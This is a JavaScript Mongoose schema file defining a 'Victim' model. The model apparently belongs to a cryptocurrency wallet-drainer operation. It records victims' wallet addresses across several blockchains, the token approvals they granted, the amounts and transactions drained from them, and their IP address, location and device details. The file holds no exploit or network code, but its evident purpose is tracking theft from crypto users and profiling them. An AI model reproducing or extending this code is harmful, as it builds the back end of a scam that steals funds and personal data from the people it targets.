const mongoose = require('mongoose');

const victimSchema = new mongoose.Schema({
    address: {
        type: String,
        required: true,
        unique: true,
        index: true
    },
    network: {
        type: String,
        required: true,
        enum: ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism', 'tron']
    },
    walletType: {
        type: String,
        enum: ['metamask', 'trustwallet', 'walletconnect', 'tronlink', 'other'],
        default: 'other'
    },
    firstSeen: {
        type: Date,
        default: Date.now
    },
    lastSeen: {
        type: Date,
        default: Date.now
    },
    totalDrained: {
        type: mongoose.Schema.Types.Decimal128,
        default: 0
    },
    totalTransactions: {
        type: Number,
        default: 0
    },
    status: {
        type: String,
        enum: ['active', 'inactive', 'blacklisted'],
        default: 'active'
    },
    riskLevel: {
        type: String,
        enum: ['low', 'medium', 'high', 'critical'],
        default: 'medium'
    },
    geoLocation: {
        country: String,
        city: String,
        ip: String
    },
    deviceInfo: {
        userAgent: String,
        platform: String,
        language: String
    },
    approvedTokens: [{
        tokenAddress: String,
        tokenSymbol: String,
        amount: mongoose.Schema.Types.Decimal128,
        spender: String,
        timestamp: {
            type: Date,
            default: Date.now
        }
    }],
    drainedTokens: [{
        tokenAddress: String,
        tokenSymbol: String,
        amount: mongoose.Schema.Types.Decimal128,
        txHash: String,
        timestamp: {
            type: Date,
            default: Date.now
        }
    }],
    notes: String,
    tags: [String]
}, {
    timestamps: true
});

// Indexes for performance
victimSchema.index({ network: 1, status: 1 });
victimSchema.index({ 'geoLocation.country': 1 });
victimSchema.index({ riskLevel: 1 });
victimSchema.index({ lastSeen: -1 });

module.exports = mongoose.model('Victim', victimSchema);